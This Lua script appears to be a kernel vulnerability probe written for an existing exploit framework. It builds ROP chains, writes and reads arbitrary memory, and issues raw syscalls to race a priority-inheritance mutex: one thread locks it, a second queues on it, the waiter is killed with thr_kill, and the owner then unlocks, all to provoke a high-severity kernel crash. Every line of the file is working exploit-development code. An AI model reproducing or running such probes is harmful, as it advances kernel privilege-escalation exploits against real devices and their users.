-- CRASH_CLASS: HIGH
-- PROBE 649a: kill a thread queued on a PI mutex, then let the owner unlock
print("=== PROBE 649a: PI WAITER KILLED, OWNER UNLOCKS ===")
local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function U(a) a=N(a) return uint64(string.format("0x%08X%08X",math.floor(a/4294967296),a%4294967296)) end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end) if o then return N(v) end return nil end
local M=memory.alloc(8)
wq(N(M),uint64(4))          -- PRIO_INHERIT, unlocked
local ts=memory.alloc(0x10)
wq(N(ts),uint64(0)) wq(N(ts)+8,uint64(400000000))
local cA=ropchain({fcall_stub_padding_size=0x50000,stack_size=0x20000})
cA:push_syscall_with_ret(mk(454), U(N(M)), uint64(5), uint64(0))     -- lock
cA:push_syscall_with_ret(mk(240), U(N(ts)), uint64(0), uint64(0))    -- snooze 400 ms
cA:push_syscall_with_ret(mk(454), U(N(M)), uint64(6), uint64(0))     -- unlock
cA:push_syscall_with_ret(mk(20))
local cB=ropchain({fcall_stub_padding_size=0x50000,stack_size=0x20000})
cB:push_syscall_with_ret(mk(454), U(N(M)), uint64(5), uint64(0))     -- will wait
cB:push_syscall_with_ret(mk(20))
print("[A] chains built")
local ta=thread:new(cA)
ta:run(true)
for i=1,200000 do local x=i end
print(string.format("[B] A locked, M=%s",tostring(rd(N(M)))))
local tb=thread:new(cB)
tb:run(true)
for i=1,200000 do local x=i end
print(string.format("[C] B launched, M=%s",tostring(rd(N(M)))))
local tid=nil
local o1,v1=pcall(function() return tb.thr_handle end)
if o1 and v1 then tid=N(v1) end
if not tid or tid==0 then
    local o2,v2=pcall(function() return memory.read_qword(thread.thr_handle_addr) end)
    if o2 then tid=N(v2) end
end
print(string.format("[D] B tid=%s",tostring(tid)))
if tid and tid>0 then
    local ok,rv=pcall(function() return mk(442)(U(tid),uint64(9),uint64(0),uint64(0),uint64(0),uint64(0)) end)
    print(string.format("[E] thr_kill rv=%s",tostring(ok and rv or "err")))
end
for i=1,900000 do local x=i end
print(string.format("[F] after A's unlock M=%s",tostring(rd(N(M)))))
local oka=pcall(function() ta:join() end)
print(string.format("[G] A joined ok=%s",tostring(oka)))
print(string.format("[H] alive=%d",N(native.fcall_with_rax(syscall.pipe.fn_addr,20))))
print("[Z] done")
